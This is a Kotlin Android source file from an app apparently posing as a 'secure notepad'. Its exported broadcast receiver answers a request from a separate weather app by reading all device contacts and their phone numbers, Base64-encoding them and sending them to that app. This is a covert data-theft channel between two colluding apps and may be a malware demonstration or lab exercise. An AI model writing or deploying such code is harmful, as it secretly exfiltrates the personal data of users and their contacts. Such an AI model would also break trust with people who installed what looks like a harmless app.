package com.example.bezpiecznynotatnik

import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.util.Base64
import android.util.Log
import androidx.core.content.ContextCompat

class RequestBroadcastReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        Log.d("MyBroadcastReceiver", "Broadcast received with action: ${intent.action}")
        val filter = IntentFilter(Constants.ACTION_REQUEST_CONTACTS)
        val receiver = RequestBroadcastReceiver()
        ContextCompat.registerReceiver(
            context,
            receiver,
            filter,
            ContextCompat.RECEIVER_EXPORTED
        )
        if (intent.action == Constants.ACTION_REQUEST_CONTACTS) {
            Log.d("MyBroadcastReceiver", "Processing contact request")
            val contactsData = getContacts(context) // Fetch contacts
            sendContactsBroadcast(context, contactsData) // Broadcast contacts
        }
    }

    private fun getContacts(context: Context): String {
        val contacts = StringBuilder()
        val resolver = context.contentResolver
        val cursor = resolver.query(
            android.provider.ContactsContract.Contacts.CONTENT_URI,
            null, null, null, null
        )

        cursor?.use {
            // Ensure the cursor starts at the first row
            while (it.moveToNext()) {
                val id = it.getString(it.getColumnIndexOrThrow(android.provider.ContactsContract.Contacts._ID))
                val name = it.getString(it.getColumnIndexOrThrow(android.provider.ContactsContract.Contacts.DISPLAY_NAME))

                // Check if the contact has a phone number
                val hasPhoneNumber = it.getInt(it.getColumnIndexOrThrow(android.provider.ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0

                if (hasPhoneNumber) {
                    // Query the phone numbers for this contact
                    val phoneCursor = resolver.query(
                        android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        null,
                        "${android.provider.ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
                        arrayOf(id),
                        null
                    )
                    phoneCursor?.use { pc ->
                        while (pc.moveToNext()) {
                            val phoneNumber = pc.getString(pc.getColumnIndexOrThrow(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER))
                            contacts.append("$id. Nazwa: $name, Numer: $phoneNumber\n")
                        }
                    }
                } else {
                    contacts.append("$id. Nazwa: $name, Numer: N/A\n")
                }
            }
        }
        return contacts.toString()
    }

    private fun sendContactsBroadcast(context: Context, contactsData: String) {
        val encodedData = Base64.encodeToString(contactsData.toByteArray(), Base64.DEFAULT)
        val intent = Intent()
        intent.action = Constants.ACTION_SEND_CONTACTS
        intent.component = ComponentName(
            "com.example.noaaweatherapp",  // First app's package name
            "com.example.noaaweatherapp.MyBroadcastReceiver"  // Fully qualified receiver name
        )
        intent.putExtra("data", encodedData)
        context.sendBroadcast(intent)
        Log.d("RequestBroadcastReceiver", "Contacts broadcast sent with action: ${intent.action} and data: $encodedData")
    }
}

object Constants {
    const val ACTION_REQUEST_CONTACTS = "com.example.noaaweatherapp.ACTION_REQUEST"
    const val ACTION_SEND_CONTACTS = "com.example.bezpiecznynotatnik.ACTION_SEND"
}